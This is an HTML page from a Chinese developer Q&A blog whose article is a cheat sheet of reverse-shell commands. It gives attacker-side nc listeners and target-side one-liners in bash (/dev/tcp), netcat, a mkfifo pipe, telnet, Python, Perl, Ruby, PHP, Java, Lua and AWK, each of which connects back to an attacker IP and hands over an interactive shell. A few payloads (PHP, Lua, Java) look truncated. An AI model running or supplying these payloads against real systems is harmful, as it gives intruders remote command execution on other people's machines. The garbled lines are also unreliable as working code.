@@ -1,0 +1,430 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>几种常见反弹shell汇总 | 开发者问答集锦</title>
+    <meta property="og:title" content="几种常见反弹shell汇总 - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="几种常见反弹shell汇总">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E5%8F%8D%E5%BC%B9shell%E6%B1%87%E6%80%BB/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">几种常见反弹shell汇总</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            
+
+<h3 id="文章目录">文章目录</h3>
+
+<pre><code>  * 0x01. bash
+  * 0x02. nc(netcat)反弹
+  * 0x03. telnet反弹
+  * 常见脚本反弹
+    * 1\. python
+    * 2\. perl
+    * 3\. Ruby
+    * 4\. PHP
+    * 5\. Java
+    * 6\. Lua
+    * 7\. AWK 反弹
+  * Reference
+</code></pre>
+
+<h3 id="0x01-bash">0x01. bash</h3>
+
+<ol>
+<li><p>在攻击主机上执行端口监听：</p>
+
+<p>nc -lvvp port               //port 为攻击主机端口号，并且此端口号没有被占用</p></li>
+
+<li><p>在目标主机上执行：</p>
+
+<p>bash -i &gt;&amp; /dev/tcp/攻击主机ip/port 0&gt;&amp;1                //port 为攻击主机端口号</p></li>
+
+<li><p>解释：</p>
+
+<p>bash -i   打开一个交互的bash</p>
+
+<blockquote>
+<p>&amp;   将标准错误输出重定向到标准输出</p>
+</blockquote>
+
+<p>/dev/tcp/x.x.x.x/port   意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口</p>
+
+<p>0&gt;&amp;1   标准输入重定向到标准输出，实现你与反弹出来的shell的交互</p></li>
+</ol>
+
+<blockquote>
+<p>/dev/tcp/
+是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。</p>
+</blockquote>
+
+<p>其他版本：</p>
+
+<pre><code>exec 5&lt;&gt;/dev/tcp/x.x.x.x/9999
+
+cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done
+</code></pre>
+
+<ul>
+<li><p>第一条命令 建立与x.x.x.x:9999的tcp连接，并将标准输入输出作为device 5的标准输入输出</p></li>
+
+<li><p>第二条cat while read line; do $line 2&gt;&amp;5 &gt;&amp;5 一旦获取到命令便运行 然后将标准输入输出以及标准错误输出到device5中</p></li>
+</ul>
+
+<h3 id="0x02-nc-netcat-反弹">0x02. nc(netcat)反弹</h3>
+
+<ol>
+<li><p>在攻击主机上执行端口监听：</p>
+
+<p>nc -lvvp port               //port 为攻击主机端口号，并且此端口号没有被占用</p></li>
+
+<li><p>在目标主机上执行：</p>
+
+<p>nc -e /bin/bash 攻击主机ip port</p></li>
+
+<li><p>还可以在目标主机上这样执行</p>
+
+<p>nc x.x.x.x 1234|/bin/bash|nc x.x.x.x 4321               //在攻击主机上打开两个终端，分别监听 1234 和 4321 端口，得到反弹shell后，1234 终端 输入命令， 4321 终端就会获得执行相应命令后的结果</p></li>
+
+<li><p>由于现在很多主机上可能没有netcat了，所以如果遇到虽然有netcat 但不支持 <code>nc -e /bin/bash 攻击主机ip port</code> 中 <code>-e</code>选项的主机，还可以这样反弹shell</p>
+
+<p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</p></li>
+</ol>
+
+<ul>
+<li><code>rm /tmp/f</code> 删除命令</li>
+<li><code>mkfifo /tmp/f;</code> 在tmp目录下写fifo文件f</li>
+<li><code>/bin/sh -i 2&gt;&amp;1</code> 将/bin/sh 的标准错误重定向到标准输出</li>
+<li><code>nc x.x.x.x 2333 &gt;/tmp/f</code>将nc监听到的输入 输入到fifo</li>
+</ul>
+
+<h3 id="0x03-telnet反弹">0x03. telnet反弹</h3>
+
+<ol>
+<li><p>在攻击主机上打开两个终端分别监听 1234 和 4321端口,(确保端口开放，并且不被占用)，得到反弹shell后，1234 终端 输入命令， 4321 终端就会获得执行相应命令后的结果：</p>
+
+<p>nc -lvvp 1234</p>
+
+<p>nc -lvvp 4321</p></li>
+
+<li><p>在目标主机上执行：</p>
+
+<p>telnet 攻击主机ip 1234 | /bin/bash | telnet 攻击主机ip 4321</p></li>
+</ol>
+
+<h3 id="常见脚本反弹">常见脚本反弹</h3>
+
+<p><strong>以上脚本是在目标主机上执行，其中 x.x.x.x 均为攻击主机ip，并且需要提前在攻击主机上进行监听相关端口,接下来就不再赘述</strong></p>
+
+<h4 id="1-python">1. python</h4>
+
+<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'
+</code></pre>
+
+<h4 id="2-perl">2. perl</h4>
+
+<p>方法一：</p>
+
+<pre><code>perl -e 'use Socket;$i=&quot;x.x.x.x&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+</code></pre>
+
+<p>方法二：</p>
+
+<pre><code>perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+</code></pre>
+
+<h4 id="3-ruby">3. Ruby</h4>
+
+<pre><code>ruby -rsocket -e 'exit if fork;c=TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end'
+</code></pre>
+
+<h4 id="4-php">4. PHP</h4>
+
+<pre><code>php -r '$sock=fsockopen(&quot;x.x.x.x&quot;,5555);exec(&quot;/bin/bash -i &amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+
+<h4 id="5-java">5. Java</h4>
+
+<pre><code>    public class Revs {
+    /**
+    * @param args
+    * @throws Exception 
+    */
+    public static void main(String[] args) throws Exception {
+        // TODO Auto-generated method stub
+        Runtime r = Runtime.getRuntime();
+        String cmd[]= {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &amp;5 &gt;&amp;5; done&quot;};
+        Process p = r.exec(cmd);
+        p.waitFor();
+    }
+}
+</code></pre>
+
+<h4 id="6-lua">6. Lua</h4>
+
+<pre><code>lua -e &quot;require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','5555');os.execute('/bin/sh -i &amp;3 2&gt;&amp;3');&quot;
+</code></pre>
+
+<h4 id="7-awk-反弹">7. AWK 反弹</h4>
+
+<p>攻击的机器监听，在收到shell的时候不可以输入enter，不然会断开</p>
+
+<pre><code>awk 'BEGIN{s=&quot;/inet/tcp/0/x.x.x.x/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)}'
+</code></pre>
+
+<h3 id="reference">Reference</h3>
+
+<ul>
+<li><a href="https://www.bertramc.cn/2017/07/14/38.html">https://www.bertramc.cn/2017/07/14/38.html</a></li>
+<li><a href="https://blog.csdn.net/wanzt123/article/details/81879599">https://blog.csdn.net/wanzt123/article/details/81879599</a></li>
+<li></li>
+</ul>
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
